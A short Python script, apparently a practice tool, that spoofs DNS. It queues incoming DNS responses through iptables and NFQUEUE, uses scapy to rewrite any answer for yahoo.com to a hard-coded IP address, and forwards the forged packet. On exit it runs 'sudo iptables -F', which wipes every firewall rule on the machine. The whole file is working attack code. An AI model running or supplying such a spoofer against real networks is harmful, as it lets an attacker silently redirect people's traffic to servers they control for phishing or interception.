#!/usr/bin/env/python

import os
import scapy.all as scapy
import netfilterqueue
import signal
import sys

# Gracefully exits program by capturing SIGINT
def signal_handler(sig, frame):
        print()
        print('Stopping spoof')
        os.system('sudo iptables -F') #
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

# # Use iptables to chain list of rules together to queue DNS packets
os.system('sudo iptables -I INPUT -p udp --sport 53 -j NFQUEUE --queue-bypass')

print("Go to yahoo.com to see spoofing in action")
print("Press crtl + c to stop spoofing at any time")
# After the queue is created to trap the request & response, accessing this queue...
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # converting packets to scapy packets

    if scapy_packet.haslayer(scapy.DNSRR): #DNSResourceRecord for reponse
        qname = scapy_packet[scapy.DNSQR].qname #DNSQuestionRecord for request
        if "yahoo.com" in qname:
            # Create DNSRR[response] with spoofed fields
            answer = scapy.DNSRR(rrname=qname, rdata="160.153.63.10") # rdata = x.com
            scapy_packet[scapy.DNS].an = answer #modifying the answer field
            scapy_packet[scapy.DNS].ancount = 1 #hardcoded to a single answer
            # Removing len and checksum fields for IP and UDP layer, scapy will recalculate them for spoofed packet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(str(scapy_packet)) #set payload as modified scapy packet
    packet.accept() #to forward the packet to dest

queue = netfilterqueue.NetfilterQueue() # instance
queue.bind(0, process_packet) # process_packet -> callback function
# to connect/bind to queue0
queue.run()


